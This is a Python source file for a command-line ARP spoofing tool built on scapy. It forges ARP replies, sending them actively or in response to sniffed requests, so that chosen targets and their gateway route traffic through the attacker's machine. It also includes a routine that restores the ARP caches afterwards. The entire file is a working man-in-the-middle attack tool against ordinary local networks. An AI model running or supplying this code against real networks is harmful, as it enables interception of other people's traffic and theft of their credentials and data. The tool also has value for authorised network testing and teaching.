from scapy.all import (
    Ether,
    ARP,
    sendp,
    conf,
    getmacbyip,
    Packet,
    sniff,
    AsyncSniffer,
)
from PythonToolsKit.GetType import get_ipv4_addresses
from PythonToolsKit.ScapyTools import ScapyArguments
from PythonToolsKit.Logs import get_custom_logger
from scapy.interfaces import NetworkInterface
from logging import Logger, DEBUG, WARNING
from collections.abc import Callable
from ipaddress import IPv4Address
from socket import gethostbyname
from argparse import Namespace
from typing import ValuesView
from functools import partial
from time import sleep
from sys import exit

conf_iface: NetworkInterface = conf.iface


class SpooferARP:
    def __init__(
        self,
        gateway: str,
        targets: str,
        iface: NetworkInterface = conf_iface,
        semi: bool = False,
        inter: float = 0.5,
    ):
        self.semi = semi
        self.inter = inter
        self.iface = iface
        self.gateway_name = gateway

        try:
            gateway = self.gateway = str(IPv4Address(gateway))
        except ValueError:
            gateway = self.gateway = gethostbyname(gateway)
        try:
            targets_object = get_ipv4_addresses(targets)
        except ValueError as e:
            logger_error(f"Invalid IP addresses or network: {e.__class__.__name__}: {e}")
            
        self.my_mac = iface.mac or '00:00:00:00:00:00'
        gateway_mac = self.gateway_mac = getmacbyip(gateway, chainCC=1)
        spoof_addresses = self.spoof_addresses = {
            str(ip): getmacbyip(str(ip), chainCC=1) for ip in targets_object
        }
        self.run = True
        self.build_packets()

    def build_packets(self) -> None:
        packets_spoof_gateway = self.packets_spoof_gateway = {}
        packets_spoof_targets = self.packets_spoof_targets = {}
        my_mac = self.my_mac
        gateway = self.gateway
        gateway_mac = self.gateway_mac

        for ip, mac in self.spoof_addresses.items():
            packets_spoof_gateway[ip] = Ether(dst=mac, src=my_mac) / ARP(
                op=2, pdst=ip, psrc=gateway, hwsrc=my_mac
            )
            packets_spoof_targets[ip] = Ether(
                dst=gateway_mac, src=my_mac
            ) / ARP(
                op=2,
                pdst=gateway,
                psrc=ip,
                hwsrc=my_mac,
            )

    def active_cache_poisonning(self) -> None:
        active_spoof = self.active_spoof
        inter = self.inter

        while self.run:
            active_spoof()
            sleep(inter)

        self.restore()

    def active_spoof(self) -> None:
        iface = self.iface
        gateway = self.gateway

        for ip, packet in self.packets_spoof_targets.items():
            sendp(
                packet,
                iface=iface,
                verbose=0,
            )

        if not self.semi:
            for ip, packet in self.packets_spoof_gateway.items():
                sendp(
                    packet,
                    iface=iface,
                    verbose=0,
                )

    def passive_cache_poisonning(self, asynchronous: bool = False) -> None:
        lfilter = partial(self.filter, mac_addresses=self.spoof_addresses.values())

        if asynchronous:
            self.sniffer = AsyncSniffer(
                store=False,
                lfilter=lfilter,
                stop_filter=lambda x: self.run,
                prn=self.passive_spoof,
                iface=self.iface,
            )
            self.sniffer.start()
        else:
            sniff(
                store=False,
                lfilter=lfilter,
                stop_filter=lambda x: not self.run,
                prn=self.passive_spoof,
                iface=self.iface,
            )
            self.restore()

    def passive_spoof(self, packet: Packet) -> None:
        gateway = self.gateway
        arp = packet[ARP]
        source = arp.psrc

        if source == gateway:
            destination = arp.pdst
            sendp(
                self.packets_spoof_gateway[destination],
                iface=self.iface,
                verbose=0,
            )
        else:
            sendp(
                self.packets_spoof_targets[source],
                iface=self.iface,
                verbose=0,
            )

    def filter(self, packet: Packet, mac_addresses: ValuesView = ()) -> bool:
        if packet.haslayer(ARP):
            getlayer = packet.getlayer
            arp = getlayer(ARP)
            ethernet = getlayer(Ether)

            return arp.op == 1 and (
                (ethernet.src in mac_addresses and arp.pdst == self.gateway)
                or (
                    ethernet.src == self.gateway_mac
                    and arp.pdst in self.spoof_addresses
                )
            )
        return False

    def restore(self) -> None:
        gateway_mac = self.gateway_mac
        gateway = self.gateway
        iface = self.iface
        semi = self.semi

        for count in range(7):
            for ip, mac in self.spoof_addresses.items():
                sendp(
                    Ether(src=gateway_mac, dst=mac)
                    / ARP(
                        op=2,
                        pdst=ip,
                        psrc=gateway,
                        hwsrc=gateway_mac,
                    ),
                    iface=iface,
                    verbose=0,
                )

                if not semi:
                    sendp(
                        Ether(src=mac, dst=gateway_mac)
                        / ARP(
                            op=2,
                            pdst=gateway,
                            psrc=ip,
                            hwsrc=mac,
                        ),
                        iface=iface,
                        verbose=0,
                    )
            sleep(0.5)


def parse_args() -> Namespace:
    parser = ScapyArguments()
    add_argument = parser.add_argument
    add_argument("gateway", help="Gateway IP or hostname")
    add_argument("targets", help="Targets IP addresses")
    add_argument("--verbose", "-v", help="Mode verbose", action="store_true")
    add_argument("--time", "-t", help="Time between ARP packets", type=float, default=0.5)
    add_argument("--semi", "-s", help="Spoof gateway IP", action="store_true")
    add_argument("--passive", "-p", help="Passive mode", action="store_true")
    return parser.parse_args()


def main() -> int:
    arguments = parse_args()
    iface = arguments.iface
    logger.setLevel(DEBUG if arguments.verbose else WARNING)

    spoofer = SpooferARP(
        arguments.gateway,
        arguments.targets,
        iface,
        arguments.semi,
        arguments.time,
    )

    if arguments.passive:
        attribute = "passive_cache_poisonning"
    else:
        attribute = "active_cache_poisonning"

    try:
        getattr(spoofer, attribute)()
    except KeyboardInterrupt:
        spoofer.run = False
        sniffer = getattr(spoofer, "sniffer", None)
        if sniffer:
            sniffer.stop()
    except Exception as e:
        from traceback import print_exc
        print_exc()
    finally:
        spoofer.restore()
        return 0
    return 1


logger: Logger = get_custom_logger(__name__)
logger_debug: Callable = logger.debug
logger_info: Callable = logger.info
logger_warning: Callable = logger.warning
logger_error: Callable = logger.error
logger_critical: Callable = logger.critical

if __name__ == "__main__":
    exit(main())
